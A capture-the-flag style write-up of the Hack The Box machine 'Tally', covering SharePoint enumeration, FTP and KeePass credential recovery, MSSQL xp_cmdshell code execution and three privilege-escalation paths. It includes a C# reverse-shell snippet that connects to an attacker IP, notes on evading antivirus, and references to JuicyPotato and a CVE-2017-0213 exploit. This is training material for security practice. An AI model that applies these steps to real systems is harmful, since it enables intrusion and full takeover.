---
layout: post
title:  "HTB Writeup [Windows - Hard] - Tally"
published: false
---

![](/assets/Tally/Tally.png)

## Summary
- Tally is great box with multiple exploit paths for both initial access and privilege escalation.
- We find a SharePoint site on port 80 which we enumerate to find a web page with a couple of interesting pieces of information.
- One: being credentials for the listening FTP service. And, Two: being intel about an HTML document to be uploaded to the FTP share for review by another user.
- After successfully logging into FTP, we find an installer for a specific version of Firefox which was vulnerable to an RCE vulnerability and exploitable with a malicious HTML.
- Having confirmed that the victim was using that version, we plant a payload but fail to get code execution due to the inconsistency of the exploit. So we move along.
- Going through the rest of the FTP share, we find a KeePass database file which we crack to gain access to an SMB share.
- On that share, we find a custom binary that contained credentials for the MSSQL instance on the box as the `sa` user.
- After we authenticated, we enabled the `xp_cmdshell` feature and were able to execute a reverse shell and get on the system.
- Having gained access through MSSQL, we had the `SeImpersonatePrivilege` which we easily exploited using Juicy Potato to escalate our privileges to `NT AUTHORITY\System`.
- There was another unintended path for privesc using a modifiable PowerShell script that was running as the `Administrator` user as part of a scheduled task.
- We added a PowerShell reverse shell to that script and owned the box a second way.
- A third path -which was the intended one- was to use CVE-2017-0213. We found the C++ code for it on GitHub but couldn't compile it due to an error.
- We googled the error and were able to build the exploit binary. However, it only worked when we used the x86 version in an interactive process. We managed to provide the latter through a Metasploit meterpreter shell.

---

## NMAP
```
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Microsoft SharePoint
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://tally/_layouts/15/start.aspx#/default.aspx
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-23T12:49:21
|_Not valid after:  2052-08-23T12:49:21
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
15567/tcp open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-title: Site doesn't have a title.
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Service Unavailable
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-08-23T13:00:42
|_  start_date: 2022-08-23T12:49:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

`nmap` gives us a bunch of information:
1. FTP port open
2. There's a Microsoft SharePoint Instance on port 80
3. MSSQL on default port 1433
4. WinRM available
5. Another HTTP port there on 15567

## Quick FTP Check
Before checking SharePoint, we pass by FTP to see if it's offering any freebies :D

![](/assets/Tally/no-ftp-anon.jpg)

Nope!

## Enumerating Sharepoint
Checking the website, we get redirected to `/_layouts/15/start.aspx#/default.aspx`

![](/assets/Tally/sharepoint-home-page.jpg)

To enumerate SharePoint, we will do a `gobuster` using a wordlist from `seclists`.

when doing a quick `find`, we get two lists. But they happen to be almost identical.

![](/assets/Tally/comparing-sharpoint-wordlists.jpg)

the `sharepoint.txt` had more endpoints. for max coverage, I removed the first `/` from `Sharepoint.fuzz.txt` and added both to one inclusive list.

![](/assets/Tally/adding-up-sharepoint-lists.jpg)

and launched `gobuster` at it.

![](/assets/Tally/gobuster.jpg)

we get a load of pages to check. One was special though: `/_layouts/15/viewlsts.aspx`

![](/assets/Tally/sharepoint-file-list.jpg)

The "Documents" list had something interesting

![](/assets/Tally/documents-sub-site.jpg)

When we opened the file we found ourselves a password :)

![](/assets/Tally/ftp-details-document.jpg)

Before trying anything, we went back to verify the "Site Pages" list

![](/assets/Tally/site-pages-list.jpg)

We have a lot of information here

![](/assets/Tally/migration-update-note.jpg)

- we got 4 usernames: Rahul, ftp_user, Sarah & Tim
- we know Rahul is expected to put an `index.html` file in the "Intranet" folder which we're sure either Sarah or Tim will open. This is could very well be a client-side attack vector.

but let's first spray those credentials over both SMB and FTP

![](/assets/Tally/smb-worked-for-ftp-user.jpg)

SMB worked, but there was no permissions over any shares.

We did a RID enumeration to find the local users after the `--users` flag failed.

![](/assets/Tally/user-enumeration.jpg)

But it looks like that's as far we're going to go with SMB. let's get back to FTP because we're positive we have access there.

![](/assets/Tally/ftp-access-confirmed-hydra.jpg)

## Back to FTP

![](/assets/Tally/ftp-directories.jpg)

After browsing the FTP and finding a lot of files and folders there, we decide we should download it to our kali to be able to use utilities like `find` and for speed.

we can do so with `wget`'s `-m` flag (for mirror).

```bash
wget -m ftp://ftp_user:'UTDRSCH53c"$6hys'@tally
```

when we go into the "Intranet" folder (mentioned in the note we found earlier), we find a sub-folder called binaries.

It contained a certain version of the Firefox browser which was vulnerable.

![](/assets/Tally/3-exploits-for-vuln-firefox.jpg)

## Checking Out Firefox Exploits

Our theory is: if we found this installer, that means that there's a high chance it's being used in the environment.

And since either Sarah or Tim will be checking an `index.html` from Rahul, they will probably use that version of Firefox to do so.

And that's where the exploit should come in.

To confirm our theory and before spending any time on this path, we will upload an `index.html` to the "Intranet" folder

and set its contents to redirect to our kali.

![](/assets/Tally/index-html-redirect.jpg)

After a couple of minutes, we get our confirmation :)

![](/assets/Tally/victim-firefox-version-confirmed.jpg)

We first check the Metasploit module but it turned out it wasn't a match for the version we found.

![](/assets/Tally/MSF-firefox-exploit-no-match.jpg)

We then turn to the one which had an exact version match match.

![](/assets/Tally/edb-firefox-exploit-verified.jpg)

it was verified and everything. And it did work well when we tested it.

![](/assets/Tally/calc-works-ff-exploit.jpg)

but that was it. Only `Calc.exe` worked. no matter how many shellcodes we generated using `sc2asmjs.py`. they all failed.

![](/assets/Tally/ff-exploit-instructions.jpg)

Hours passed here without results. So we had to move on :/

## Finding Creds Elsewhere
Continuing to search in FTP, we find a KeePass file in `tim`'s files.

![](/assets/Tally/keepass-file-found.jpg)

we convert it to a hash using `keepass2john` and crack it.

![](/assets/Tally/keepass-pass-cracked.jpg)

and carry the .kdbx file over to our windows VM along with the KeePass exe files that were on the share to run the application.

we find a password for a share called ACCT (we found that earlier when checking the SMB shares with the `ftp_user` account)

![](/assets/Tally/keepass-passwords.jpg)

and another password that looks for a cisco product.

![](/assets/Tally/cisco-password.jpg)

Automatically, we shuffle all the users we have with all the passwords and do a spray :D

![](/assets/Tally/spray-and-finance-share-access.jpg)

As expected, we get access to the ACCT share with the `Finance` user. and we ruled out any password reuse.

## Going through the ACCT share
We mounted the share successfully and started browsing it.

![](/assets/Tally/mounting-the-smb-share.jpg)

we find a set of creds in the "/zz_Arhived/SQL" folder but they were indeed old.

![](/assets/Tally/old-db-creds.jpg)

Later on, we find a custom binary called "tester.exe" in "/zz_Migration/Binaries/New folder"

![](/assets/Tally/tester-exe-found.jpg)

when running `strings` against it, we find creds inside:

![](/assets/Tally/db-password-found.jpg)

## Getting a shell through MSSQL DB
The creds worked when we connected to MSSQL on port 1433.

However, to execute commands, we needed to enable the `xp_cmdshell` feature which was initially blocked.

At first, it wouldn't be enabled as it was set as an "advanced option".

When we enabled the "show advanced options" option, we were able re-enable the `xp_cmdshell` option and get code execution as the `sarah` user.

![](/assets/Tally/enabling-xp-cmd-shell-mssql.jpg)

because the `xp_cmdshell` option kept getting automatically disabled, we set the MSSQL commands in a file.

We added the code to re-enable it then do a PowerShell web request for a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) which we hosted on our server.

![](/assets/Tally/shell-as-sarah.jpg)

We got our shell :]

## Privesc Path #1: Abusing the SeImpersonatePrivilege

Since we got in through MSSQL, we're sure we have the `SeImpersonatePrivilege` which is ripe for exploitation using `JuicyPotato` :D

we download the binary [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`

and from experience, it's best to give this tool a single executable to run rather than pass it arguments.

so our choice for this is a standard C# revere shell. you can find its source [here](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

note: it's also good for bypassing Anti-virus.

we modify the code adding our ip and port
```C#
public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.10.16.4", 9001))
			{
				using(Stream stream = client.GetStream())
```

and compile it using the .NET framework compiler (you can ingore the compilation errors)
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
```

![](/assets/Tally/compilin-csharp-rev.jpg)

after running Juicy Potato with the shell to execute, it gives us back a reverse shell as `nt authority\system`

![](/assets/Tally/juicy-potato-to-system-rev-shell.jpg)


## Privesc Path #2: Modifying the Scheduled PowerShell Script
On Sarah's desktop, we found a Powershell script called `SPBestWarmup.ps1` and another xml file with the same name `SPBestWarmup.xml`

![](/assets/Tally/spwarmup-scripts.jpg)

when looking within the XML file, we notice something:

![](/assets/Tally/spwarmup-xml-contents.jpg)

these are the options we find in task scheduler when creating any task.

We run a quick command `Get-ACL` to find if we can write to this script

![](/assets/Tally/write-access-to-script.jpg)

we're good! :D

We added a reverse shell to that script right away.

However, that script was configured to run every hour. so we had to wait for it :S

But eventually, we received a shell as `Administrator`

![](/assets/Tally/shell-as-administrator.jpg)

## Privesc Path #3: CVE-2017-0213
After taking over the machine using the above two ways, I found that this was the intended path :D

To exploit this vulnerability, we first got ourselves a meterpreter shell using first our C# reverse shell then Metasploit's `shell_to_meterpreter` module.

the command `sessions -u 1` means "upgrade session 1"

![](/assets/Tally/upgrade-to-meterpreter.jpg)

we're going to compile the source code [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) in Visual Studio.

But we were getting an error:

![](/assets/Tally/eop-cve-compile-error.jpg)

when Googling this error (including the variable name), we find a stack overflow question which was answered.

![](/assets/Tally/google-stackoverflow.jpg)

![](/assets/Tally/exploit-error-fix.jpg)

when:
1. applying the fix
2. editing the `cmdline` variable for our shell path (normal exploit behavior is to run a `cmd.exe` which is just for demonstration)
3. selecting the process architecutre as `x86`

we can successfully compile the exploit

![](/assets/Tally/cpp-build-succeeded.jpg)

and upload it to `sarah`'s home folder

![](/assets/Tally/uploading-privesc-cve.jpg)

but it wouldn't work unless we migrate to an interactive process.

we do that through metepreter using `ps` then looking for a process with a Session ID equal to 1

![](/assets/Tally/finding-interactive-session.jpg)

we migrate succesfully but to `svchost.exe` because it's more stable than the one highlighted above.

![](/assets/Tally/migration-done.jpg)

we then drop into a cmd shell with the `shell` command and launch the exploit to get a connection back as `nt authority\system`

![](/assets/Tally/cve-eop-worked.jpg)